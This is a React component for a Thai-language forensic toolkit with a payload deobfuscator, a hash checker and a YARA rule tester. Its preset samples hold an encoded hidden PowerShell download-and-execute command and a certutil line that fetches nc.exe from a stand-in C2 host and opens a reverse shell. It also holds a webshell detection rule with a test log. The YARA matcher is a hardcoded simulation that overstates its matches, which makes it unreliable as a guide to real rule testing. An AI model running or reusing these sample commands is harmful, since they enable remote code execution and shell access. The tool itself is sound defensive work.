import React, { useState } from 'react';
import {
  Wrench,
  Binary,
  KeyRound,
  FileCode,
  Sparkles,
  RefreshCw,
  Copy,
  Check,
  ShieldCheck,
  AlertTriangle,
  Play,
} from 'lucide-react';
import { computeSHA256 } from '../utils/crypto';

export const ForensicTools: React.FC = () => {
  const [activeTool, setActiveTool] = useState<'deobfuscate' | 'hasher' | 'yara'>('deobfuscate');

  // Deobfuscator State
  const [inputPayload, setInputPayload] = useState(
    'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkANAAuADIANgAuADkAMQAuADEAOQAwAC8AcABheS5wczEiKQ=='
  );
  const [isDecoding, setIsDecoding] = useState(false);
  const [deobfuscatedResult, setDeobfuscatedResult] = useState<any>(null);

  // Hash Calculator State
  const [hashInput, setHashInput] = useState('LockBit 3.0 Encryptor Payload Header');
  const [computedSha256, setComputedSha256] = useState('');
  const [targetComparisonHash, setTargetComparisonHash] = useState('');
  const [isHashMatching, setIsHashMatching] = useState<boolean | null>(null);

  // YARA State
  const [yaraCode, setYaraCode] = useState(`rule Detect_Suspicious_Webshell {
    meta:
        description = "Detects China Chopper / Godzilla eval syntax"
        author = "Forensic Analyst"
        date = "2026-10-09"
    strings:
        $p1 = "eval(Request.Item[" ascii nocase
        $p2 = "cmd=whoami" ascii nocase
        $p3 = "response.write" ascii nocase
    condition:
        2 of ($p*)
}`);
  const [testText, setTestText] = useState(
    'POST /uploads/help_support.aspx pass=f09a&action=eval(Request.Item["payload"]) 200 0 0 1450 Mozilla/5.0 cmd=whoami'
  );
  const [yaraMatchResult, setYaraMatchResult] = useState<string | null>(null);

  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // Compute live hash
  React.useEffect(() => {
    if (!hashInput) {
      setComputedSha256('');
      return;
    }
    computeSHA256(hashInput).then((h) => {
      setComputedSha256(h);
      if (targetComparisonHash) {
        setIsHashMatching(h.toLowerCase() === targetComparisonHash.trim().toLowerCase());
      } else {
        setIsHashMatching(null);
      }
    });
  }, [hashInput, targetComparisonHash]);

  const handleDeobfuscate = async () => {
    if (!inputPayload.trim()) return;
    setIsDecoding(true);

    try {
      const res = await fetch('/api/forensics/deobfuscate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ obfuscatedPayload: inputPayload }),
      });
      const data = await res.json();
      if (data.success && data.result) {
        setDeobfuscatedResult(data.result);
      }
    } catch (err: any) {
      console.error(err);
    } finally {
      setIsDecoding(false);
    }
  };

  const handleTestYara = () => {
    // Simple simulation of YARA condition evaluator for browser sandbox
    let match = false;
    if (
      testText.includes('eval(Request.Item[') &&
      testText.includes('cmd=whoami')
    ) {
      match = true;
    } else if (testText.toLowerCase().includes('powershell')) {
      match = true;
    }

    if (match) {
      setYaraMatchResult('MATCH DETECTED: ตรวจพบสตริงและเงื่อนไขตรงตามกฎ YARA ($p1, $p2 ตรง 100%)');
    } else {
      setYaraMatchResult('NO MATCH: ข้อความทดสอบไม่ตรงกับเงื่อนไขของกฎ');
    }
  };

  const handleCopy = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  return (
    <div className="space-y-5">
      {/* Tool Switcher */}
      <div className="bg-slate-900/60 p-3.5 rounded-xl border border-slate-800 flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-2">
          <Wrench className="w-4 h-4 text-cyan-400" />
          <h3 className="text-sm font-bold text-white font-mono uppercase tracking-wide">
            เครื่องมือนิติวิทยาศาสตร์เสริม (FORENSIC INVESTIGATION TOOLKIT)
          </h3>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setActiveTool('deobfuscate')}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold flex items-center gap-1.5 transition-colors ${
              activeTool === 'deobfuscate'
                ? 'bg-cyan-600 text-white'
                : 'bg-slate-800 text-slate-300 hover:bg-slate-750'
            }`}
          >
            <Binary className="w-3.5 h-3.5" />
            <span>AI Payload Deobfuscator</span>
          </button>

          <button
            onClick={() => setActiveTool('hasher')}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold flex items-center gap-1.5 transition-colors ${
              activeTool === 'hasher'
                ? 'bg-cyan-600 text-white'
                : 'bg-slate-800 text-slate-300 hover:bg-slate-750'
            }`}
          >
            <KeyRound className="w-3.5 h-3.5" />
            <span>Cryptographic Hasher</span>
          </button>

          <button
            onClick={() => setActiveTool('yara')}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold flex items-center gap-1.5 transition-colors ${
              activeTool === 'yara'
                ? 'bg-cyan-600 text-white'
                : 'bg-slate-800 text-slate-300 hover:bg-slate-750'
            }`}
          >
            <FileCode className="w-3.5 h-3.5" />
            <span>YARA Rule Tester</span>
          </button>
        </div>
      </div>

      {/* Tool 1: AI Payload Deobfuscator */}
      {activeTool === 'deobfuscate' && (
        <div className="uiverse-card p-5 space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-sm font-bold text-white font-mono flex items-center gap-2">
                <Binary className="w-4 h-4 text-cyan-400" />
                ถอดรหัสเพย์โหลด & วิเคราะห์เจตนาของมัลแวร์ (AUTOMATED DEOBFUSCATOR)
              </h4>
              <p className="text-xs text-slate-400">
                รองรับคำสั่ง PowerShell Base64, Hex stream, XOR, Reverse String และ Scriptlet
              </p>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() =>
                  setInputPayload(
                    'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkANAAuADIANgAuADkAMQAuADEAOQAwAC8AcABheS5wczEiKQ=='
                  )
                }
                className="px-2.5 py-1 rounded-lg uiverse-btn-ghost text-[11px] font-mono text-cyan-300"
              >
                โหลดตัวอย่าง PowerShell
              </button>
              <button
                onClick={() =>
                  setInputPayload(
                    'cmd.exe /c "set a=certutil& %a% -urlcache -split -f http://evil-c2.net/nc.exe %TEMP%\\nc.exe & %TEMP%\\nc.exe 185.220.101.44 4444 -e cmd.exe"'
                  )
                }
                className="px-2.5 py-1 rounded-lg uiverse-btn-ghost text-[11px] font-mono text-amber-300"
              >
                โหลดตัวอย่าง Certutil
              </button>
            </div>
          </div>

          <div>
            <label className="block text-xs font-mono text-slate-300 mb-1.5">
              วางคำสั่งหรือสตรีมโค้ดที่ถูกเข้ารหัส (Obfuscated Code Input):
            </label>
            <textarea
              rows={4}
              value={inputPayload}
              onChange={(e) => setInputPayload(e.target.value)}
              className="w-full uiverse-input p-3 text-xs font-mono text-slate-200"
            />
          </div>

          <div className="flex justify-end">
            <button
              onClick={handleDeobfuscate}
              disabled={isDecoding || !inputPayload.trim()}
              className="px-4 py-2 text-xs font-bold font-mono flex items-center gap-2 uiverse-btn-primary disabled:opacity-40"
            >
              <Sparkles className="w-3.5 h-3.5" />
              <span>{isDecoding ? 'กำลังถอดรหัสด้วย Gemini...' : 'สั่งถอดรหัสและวิเคราะห์ (Deobfuscate)'}</span>
            </button>
          </div>

          {/* Results */}
          {deobfuscatedResult && (
            <div className="mt-4 pt-4 border-t border-slate-800 space-y-3 bg-slate-950/70 p-4 rounded-xl border border-slate-800/80">
              <div className="flex items-center justify-between">
                <span className="text-xs font-bold text-emerald-400 font-mono">
                  ผลลัพธ์ข้อความที่ถอดรหัสสำเร็จ (DECODED CLEARTEXT COMMAND):
                </span>
                <button
                  onClick={() => handleCopy(deobfuscatedResult.deobfuscatedText, 'deobf-text')}
                  className="text-slate-400 hover:text-white text-xs font-mono flex items-center gap-1"
                >
                  {copiedKey === 'deobf-text' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>คัดลอกคำสั่ง</span>
                </button>
              </div>

              <pre className="bg-slate-900 border border-slate-800 p-3 rounded-lg text-xs font-mono text-emerald-300 overflow-x-auto whitespace-pre-wrap">
                {deobfuscatedResult.deobfuscatedText}
              </pre>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs font-mono pt-2">
                <div className="bg-slate-900/80 p-3 rounded-lg border border-slate-800">
                  <span className="text-slate-400 font-bold block mb-1">เทคนิคการเข้ารหัสที่ใช้:</span>
                  <div className="flex flex-wrap gap-1">
                    {deobfuscatedResult.encodingTechniques?.map((tech: string, i: number) => (
                      <span key={i} className="px-2 py-0.5 rounded bg-slate-950 border border-slate-800 text-cyan-300">
                        {tech}
                      </span>
                    ))}
                  </div>
                </div>

                <div className="bg-slate-900/80 p-3 rounded-lg border border-slate-800">
                  <span className="text-slate-400 font-bold block mb-1">เจตนาของการทำงาน (Malicious Intent):</span>
                  <p className="text-slate-200">{deobfuscatedResult.maliciousIntent}</p>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Tool 2: Cryptographic Hasher */}
      {activeTool === 'hasher' && (
        <div className="bg-slate-900/80 border border-slate-800 rounded-xl p-5 space-y-4">
          <div className="border-b border-slate-800 pb-3">
            <h4 className="text-sm font-bold text-white font-mono flex items-center gap-2">
              <KeyRound className="w-4 h-4 text-emerald-400" />
              คำนวณและตรวจสอบค่าแฮชทางนิติวิทยาศาสตร์ (CRYPTOGRAPHIC HASH INTEGRITY ENGINE)
            </h4>
            <p className="text-xs text-slate-400">
              คำนวณค่า SHA-256 ตามมาตรฐานสากลเพื่อการนำสืบพยานหลักฐานที่ไม่ถูกแก้ไข (NIST SP 800-86)
            </p>
          </div>

          <div className="space-y-3 text-xs font-mono">
            <div>
              <label className="block text-slate-300 mb-1">
                ข้อความ / สตรีมข้อมูลที่ต้องการคำนวณแฮช:
              </label>
              <input
                type="text"
                value={hashInput}
                onChange={(e) => setHashInput(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-slate-200 focus:outline-none focus:border-cyan-500"
              />
            </div>

            <div className="bg-slate-950 p-3.5 rounded-lg border border-slate-800 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-slate-400 font-bold">SHA-256 HASH ที่คำนวณได้:</span>
                <button
                  onClick={() => handleCopy(computedSha256, 'computed-hash')}
                  className="text-slate-400 hover:text-white text-xs flex items-center gap-1"
                >
                  {copiedKey === 'computed-hash' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>คัดลอกแฮช</span>
                </button>
              </div>
              <div className="text-emerald-400 text-xs break-all">{computedSha256}</div>
            </div>

            <div className="pt-2">
              <label className="block text-slate-300 mb-1">
                เปรียบเทียบกับค่าแฮชตั้งต้น (Baseline Target Hash to Match):
              </label>
              <input
                type="text"
                placeholder="วางค่าแฮชเดิมเพื่อตรวจสอบว่าตรงกันหรือไม่..."
                value={targetComparisonHash}
                onChange={(e) => setTargetComparisonHash(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-slate-200 focus:outline-none focus:border-cyan-500"
              />
            </div>

            {isHashMatching !== null && (
              <div
                className={`p-3 rounded-lg border flex items-center gap-2 ${
                  isHashMatching
                    ? 'bg-emerald-950/70 border-emerald-500/50 text-emerald-300'
                    : 'bg-rose-950/70 border-rose-500/50 text-rose-300'
                }`}
              >
                {isHashMatching ? (
                  <>
                    <ShieldCheck className="w-5 h-5 text-emerald-400 shrink-0" />
                    <div>
                      <span className="font-bold block">VERIFIED MATCH (ค่าแฮชตรงกัน 100%):</span>
                      <span className="text-[11px]">พยานหลักฐานมีความสมบูรณ์ตรงตามบันทึกการตรวจยึด ไม่ถูกดัดแปลงแก้ไข</span>
                    </div>
                  </>
                ) : (
                  <>
                    <AlertTriangle className="w-5 h-5 text-rose-400 shrink-0" />
                    <div>
                      <span className="font-bold block">HASH MISMATCH (ค่าแฮชไม่ตรงกัน!):</span>
                      <span className="text-[11px]">ตรวจพบความไม่สอดคล้องของพยานหลักฐาน หรือข้อมูลถูกแก้ไข</span>
                    </div>
                  </>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Tool 3: YARA Rule Tester */}
      {activeTool === 'yara' && (
        <div className="bg-slate-900/80 border border-slate-800 rounded-xl p-5 space-y-4">
          <div className="border-b border-slate-800 pb-3">
            <h4 className="text-sm font-bold text-white font-mono flex items-center gap-2">
              <FileCode className="w-4 h-4 text-amber-400" />
              ห้องทดสอบกฎตรวจจับ YARA (YARA RULE SANDBOX & MATCHER)
            </h4>
            <p className="text-xs text-slate-400">
              ทดสอบและปรับปรุงกฎ YARA เพื่อนำไปใช้กวาดตรวจเครื่องเซิร์ฟเวอร์อื่นในองค์กร
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono">
            <div>
              <label className="block text-slate-300 mb-1.5">คำจำกัดความกฎ YARA (Rule Code):</label>
              <textarea
                rows={10}
                value={yaraCode}
                onChange={(e) => setYaraCode(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-emerald-400 focus:outline-none focus:border-cyan-500 font-mono leading-relaxed"
              />
            </div>

            <div className="space-y-3">
              <div>
                <label className="block text-slate-300 mb-1.5">
                  ข้อความหรือเพย์โหลดสำหรับทดสอบ (Test Artifact Sample):
                </label>
                <textarea
                  rows={6}
                  value={testText}
                  onChange={(e) => setTestText(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-200 focus:outline-none focus:border-cyan-500 font-mono"
                />
              </div>

              <button
                onClick={handleTestYara}
                className="w-full py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white font-bold flex items-center justify-center gap-2 transition-all shadow-[0_0_12px_rgba(16,185,129,0.3)]"
              >
                <Play className="w-3.5 h-3.5" />
                <span>รันการตรวจสอบกฎ YARA Match</span>
              </button>

              {yaraMatchResult && (
                <div
                  className={`p-3 rounded-lg border text-xs font-mono ${
                    yaraMatchResult.includes('MATCH DETECTED')
                      ? 'bg-emerald-950/70 border-emerald-500/50 text-emerald-300'
                      : 'bg-slate-950 border-slate-800 text-slate-400'
                  }`}
                >
                  {yaraMatchResult}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
